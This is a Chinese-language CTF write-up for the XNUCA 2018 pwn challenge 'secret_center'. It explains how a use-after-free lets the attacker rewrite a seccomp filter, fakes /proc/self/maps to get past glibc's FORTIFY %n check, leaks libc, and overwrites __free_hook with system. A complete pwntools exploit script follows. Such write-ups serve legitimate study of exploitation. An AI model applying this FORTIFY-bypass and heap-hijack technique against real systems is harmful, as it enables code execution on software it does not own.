# secret_center

参考[p4nda]( http://p4nda.top/2018/11/26/XNUCA-secretcenter/ )大佬博客复现

环境`ubuntu16.04 libc2.23`

程序有：

```c
 	write(1, "[1] show secret on Server\n", 0x1AuLL);
    write(1, "[2] input my secret\n", 0x14uLL);
    write(1, "[3] delete my secret\n", 0x15uLL);
    write(1, "[4] Guard Ready\n", 0x10uLL);
    write(1, "[5] Set Guard\n", 0xEuLL);
    write(1, "[6] edit my secret\n", 0x13uLL);
    write(1, "[7] exit\n", 9uLL);
```

7个选项，其中`show`选项不能用，有漏洞的选项为：

**dele**函数：

```c
void dele()
{
  free(content);
}
```

很明显的一个`UAF`

**input**函数：

```c
if ( v3 == strlen(secret) )
    sub_C90();
  _fprintf_chk((__int64)stderr, 1LL, (__int64)&buf);
```

格式化字符串，但是由于是向stderr输出，不会输出给用户，所以没法泄露（本地是可以泄露的

**Guard Ready**和**Set Guard**函数：

`Guard Ready`给出`seccomp`的规则，然后`Set Guard`函数安装规则，但是由于这两个函数是分开的，在配合`dele`函数的`UAF`和`edit`函数，我们就可以篡改规则

然后就是要改成什么了，原先的规则是

```
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x06 0x00 0x00 0x00000000  return KILL
```

一点头绪都没有，因为用的是`fprintf`的安全版本，`%n %4$p`这种的啥也用不了了，参考博客，跟踪`_fprintf_chk`的源码，找到检测`%n`的地方：

```c
LABEL (form_number):						      \
      if (s->_flags2 & _IO_FLAGS2_FORTIFY)				      \
	{								      \
	  if (! readonly_format)					      \
	    {								      \
	      extern int __readonly_area (const void *, size_t)		      \
		attribute_hidden;					      \
	      readonly_format						      \
		= __readonly_area (format, ((STR_LEN (format) + 1)	      \
					    * sizeof (CHAR_T)));	      \
	    }								      \
	  if (readonly_format < 0)					      \
	    __libc_fatal ("*** %n in writable segment detected ***\n");	      \
	}								      \
```

可以看到如果我们能让`__readonly_area`的返回值大于等于0的话，就可以绕过保护

继续跟进`__readonly_area`:

```c
/* Return 1 if the whole area PTR .. PTR+SIZE is not writable.
   Return -1 if it is writable.  */

int
__readonly_area (const char *ptr, size_t size)
{
  const void *ptr_end = ptr + size;

  FILE *fp = fopen ("/proc/self/maps", "rce");
  if (fp == NULL)
    {
      /* It is the system administrator's choice to not have /proc
	 available to this process (e.g., because it runs in a chroot
	 environment.  Don't fail in this case.  */
      if (errno == ENOENT
	  /* The kernel has a bug in that a process is denied access
	     to the /proc filesystem if it is set[ug]id.  There has
	     been no willingness to change this in the kernel so
	     far.  */
	  || errno == EACCES)
	return 1;
      return -1;
    }
.....................................................................
```

`__readonly_area`函数会用`open`函数打开`/proc/self/maps`,然后判断写的区域是否为只读区域，如果是的话`__readonly_area`就会返回1，绕过`%n`的限制

调试的时候发现,`__readonly_area`函数里的`if (_IO_getdelim (&line, &linelen, '\n', fp) <= 0)`

里的**_IO_getdelim **会读取文件内容，所以如果我们把`open(/proc/self/maps,0)`的返回值改为0的话，原本是从文件中读取输入，就会变成从输入流中读取，而`open(/proc/self/maps,0)`返回0的话，`fopen`也不会报错，

我们仿造一行：

`000000000000-7fffffffffff r--p 00000000 00:00 0    /fakemap\x00`让`__readonly_area`函数返回1

这里一个坑就是：

```c
  fclose (fp);
  free (line);

  /* If the whole area between ptr and ptr_end is covered by read-only
     VMAs, return 1.  Otherwise return -1.  */
  return size == 0 ? 1 : -1;
```

`__readonly_area`函数的结尾会调用`fclose`,而我们使得`open`的返回值为0，对应输入流，这样`fclose`的话就会把输入流也关闭了，所以还要让`close`返回0

所以我们可以把规则改为：

```
A = arch
A == ARCH_X86_64 ? next : dead
A = sys_number 
A == close ? dead : next
A == open ? next : ok
A = args[0]
A &= 0xff
A == 0x7c ? dead : next
ok:
return ALLOW
dead:
return ERRNO(0)
```

然后用`seccomp-tools`编译一下，得到对应的字节码：

```shell
 ruan@ubuntu  /mnt/hgfs/shared/XNUCA/xnuca2018/pwn/secretcenter/secretcenter  seccomp-tools disasm rule         
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0009
 0004: 0x15 0x00 0x03 0x00000002  if (A != open) goto 0008
 0005: 0x20 0x00 0x00 0x00000010  A = args[0]
 0006: 0x54 0x00 0x00 0x000000ff  A &= 0xff
 0007: 0x15 0x01 0x00 0x0000007c  if (A == 124) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00050000  return ERRNO(0)
 ruan@ubuntu  /mnt/hgfs/shared/XNUCA/xnuca2018/pwn/secretcenter/secretcenter  
```

这样的话我们就能绕过`_fprintf_chk`对`%n`的限制，这样我就可以用格式化字符串进行地址写了，然后就是考虑往哪里写了，因为我们还没泄露地址，在`input`函数里，我们可以看到

```c
if ( v3 == strlen(secret) )
    sub_C90();
//跟进sub_C90()
__int64 sub_C90()
{
  int v0; // ebx
  int v1; // ebx
  __int64 v3; // [rsp+0h] [rbp-428h]
  unsigned __int64 v4; // [rsp+408h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  memset(&v3, 0, 0x400uLL);
  v0 = open("/proc/self/maps", 0x80000);
  read(v0, &v3, 0x400uLL);
  write(1, &v3, 0x400uLL);
  close(v0);
```

如果能使得`v3 == strlen(secret)`的话，就可以泄露地址了

下个断点在`_fprintf_chk((__int64)stderr, 1LL, (__int64)&buf);`

```asm
02:0010│ rdx rbp  0x7fff358e7390 ◂— 0x0
03:0018│          0x7fff358e7398 —▸ 0x7fff359222b0 ◂— add    byte ptr [rdi + 0x5f], bl
04:0020│          0x7fff358e73a0 —▸ 0x7f6adc869700 —▸ 0x7fff35922000 ◂— jg     0x7fff35922047
05:0028│          0x7fff358e73a8 —▸ 0x7fff358e7448 ◂— 0x0
06:0030│          0x7fff358e73b0 —▸ 0x7fff358e7444 ◂— 0x0
07:0038│          0x7fff358e73b8 —▸ 0x7f6adc64ecd8 (_dl_relocate_object+2664) ◂— test   eax, eax
08:0040│          0x7fff358e73c0 —▸ 0x5619b873b000 ◂— jg     0x5619b873b047
09:0048│          0x7fff358e73c8 —▸ 0x7f6adc404627 ◂— pop    rdi /* '__vdso_getcpu' */
0a:0050│          0x7fff358e73d0 —▸ 0x7fff358e75e0 —▸ 0x5619b873bb60 ◂— xor    ebp, ebp
0b:0058│          0x7fff358e73d8 —▸ 0x7f6adc374ef9 (sbrk+121) ◂— test   eax, eax
0c:0060│          0x7fff358e73e0 —▸ 0x7f6adc63cb20 (main_arena) ◂— 0x100000000
0d:0068│          0x7fff358e73e8 ◂— 0x80
0e:0070│          0x7fff358e73f0 ◂— 0x0
0f:0078│          0x7fff358e73f8 —▸ 0x7f6adc2ff8c9 (__default_morecore+9) ◂— mov    edx, 0
10:0080│          0x7fff358e7400 —▸ 0x7fff359222b0 ◂— add    byte ptr [rdi + 0x5f], bl
11:0088│          0x7fff358e7408 —▸ 0x7f6adc2f986b (sysmalloc+1563) ◂— test   rax, rax
12:0090│          0x7fff358e7410 —▸ 0x7fff358e7444 ◂— 0x0
13:0098│          0x7fff358e7418 ◂— 0xa0
14:00a0│          0x7fff358e7420 ◂— 0xfff
15:00a8│          0x7fff358e7428 ◂— 0xfffffffffffff000
16:00b0│          0x7fff358e7430 —▸ 0x5619ba0f8000 ◂— 0x0
pwndbg> x/4s 0x5619ba0f8010
0x5619ba0f8010:	"DwHxGpmDtDevggh"...
0x5619ba0f801f:	"t32e6464758ww7e"...
0x5619ba0f802e:	"\n"
0x5619ba0f8030:	""
```

` 0x7fff358e7430`地址里的值离`secret`很近，所以我们可以`partial overwrite`使得` 0x7fff358e7430`指向`secret`，然后我们用`%hhn`把`secret`的第一个字节改为`\x00`,即可成功泄露地址，然后是把`free_hook`改为`system`即可`getshell`,就是我们不能用`%12$hn`这样的格式化字符串，所以`payload`的构造要麻烦一点

最后的exp为：

```python
from pwn import *

context.arch='amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def fmtstr2(addr, data, written):
	cnt = 0
	datalen = len(data)
	payload = ''
	address = ''
	for i in range(0,datalen/2):
		cur = u16(data[2*i:2*i+2])
		if cur >= written&0xffff:
			to_add = cur - (written&0xffff)
		else:
			to_add = 0x10000 + cur - (written&0xffff)
		round = ''
		if to_add != 0:
			round += "%{}c".format(to_add)
		round += "%hn"
		assert(len(round) <= 0x10)
		written += to_add + 0x10 - len(round)
		payload += round.ljust(0x10, '_')
		address += p64(addr+i*2)*2
		cnt += 1
	
	return payload + address

def cmd(c):
	p.recvuntil(">")
	p.sendline(str(c))

def input_secret(sz,content):
	cmd(2)
	p.recvuntil("Size: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)

def dele():
	cmd(3)
	
def edit(sz,content):
	cmd(6)
	p.recvuntil("size: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)

def guard_ready():
	cmd(4)
	
def set_guard():
	cmd(5)

def main(host,port=20508):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./secret_center")
		debug(0x000000000000F48)
		# gdb.attach(p)
	rule = open("./rule","rb").read()
	input_secret(0xf0,"\x00")
	dele()
	guard_ready()
	edit(len(rule),rule)
	set_guard()
	payload = ("%c"*24+"%232c"+"%hhn").ljust(0xa0,"\x00")+'\x10'
	input_secret(0xf0,payload)
	p.recvuntil("Not Good Secret :P\n\n")
	p.sendline("000000000000-7fffffffffff r--p 00000000 00:00 0    /fakemap\x00")
	input_secret(0xf0,"AAAAA\x00")
	p.recvuntil("[heap]\n")
	libc.address = int(p.recvuntil('-',drop=True),16)
	info("libc : " + hex(libc.address))
	
	payload = "/bin/sh;aa"+"%c"*15+ fmtstr2(libc.symbols["__free_hook"],p64(libc.symbols["system"])[:6],25)
	
	input_secret(0xf0,payload)
	# p.recvuntil("Not Good Secret :P\n\n")
	sleep(3)
	p.sendline("000000000000-7fffffffffff r--p 00000000 00:00 0    /fakemap\x00")
	dele()
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	main(args["REMOTE"])
```



